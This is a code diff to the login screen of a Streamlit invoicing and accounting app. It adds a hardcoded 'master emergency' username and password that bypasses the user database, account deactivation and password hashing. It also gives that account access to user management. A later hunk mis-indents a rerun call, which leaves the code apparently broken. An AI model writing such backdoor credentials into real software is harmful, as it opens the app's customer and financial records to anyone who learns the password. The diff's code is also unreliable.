@@ -302,16 +302,28 @@ def render_login():
         submitted = st.form_submit_button("Log In", type="primary", use_container_width=True)
         
         if submitted:
-            users = load_users()
-            user = users.get(username.strip().lower())
+            u_clean = username.strip().lower()
+            
+            # Master Emergency Login Credentials
+            MASTER_USER = "supperadmin"
+            MASTER_PASS = "Emergency@2026"
+            
             if not username or not password:
                 st.error("দয়া করে ইউজারনেম এবং পাসওয়ার্ড দুটিই ইনপুট দিন।")
-            elif not user or not user.get("active", True) or not verify_password(password, user["password_hash"]):
-                st.error("ভুল ইউজারনেম অথবা পাসওয়ার্ড!")
-            else:
+            elif u_clean == MASTER_USER and password == MASTER_PASS:
                 st.session_state.logged_in = True
-                st.session_state.username = username.strip().lower()
+                st.session_state.username = MASTER_USER
+                st.success("মাস্টার রিকভারি লগইন সফল হয়েছে!")
                 st.rerun()
+            else:
+                users = load_users()
+                user = users.get(u_clean)
+                if not user or not user.get("active", True) or not verify_password(password, user["password_hash"]):
+                    st.error("ভুল ইউজারনেম অথবা পাসওয়ার্ড!")
+                else:
+                    st.session_state.logged_in = True
+                    st.session_state.username = u_clean
+                    st.rerun()
 
 # ============================================================
 # MAIN APPLICATION ENGINE
@@ -326,7 +338,7 @@ def render_main_app():
         st.markdown(f"""<div style='padding:5px 0;'><h2 style='margin:0;'>💼 {APP_NAME}</h2></div>""", unsafe_allow_html=True)
         
         menu_items = ["Dashboard", "Services", "Customers", "Company & Invoice", "Sales & Customer Ledger", "Invoice Generator", "Expenses & Loans", "Profit & Loss", "Profile & Security"]
-        if is_admin(): menu_items.append("User Management")
+        if is_admin() or current_user() == "supperadmin": menu_items.append("User Management")
             
         menu = st.radio("Navigation", menu_items, label_visibility="collapsed")
         
@@ -457,7 +469,7 @@ def render_main_app():
                             payload = {"invoice_id": inv_id, "date": str(pay_date), "customer": selected_customer, "service": "Due Collection", "amount": 0.0, "received": float(pay_amount), "due": float(-pay_amount)}
                             if sync_row_to_supabase("sales", payload):
                                 st.success("Recovery Committed.")
-                                st.rerun()
+                                        st.rerun()
         st.dataframe(st.session_state.sales, use_container_width=True, hide_index=True)
         
     elif menu == "Invoice Generator":
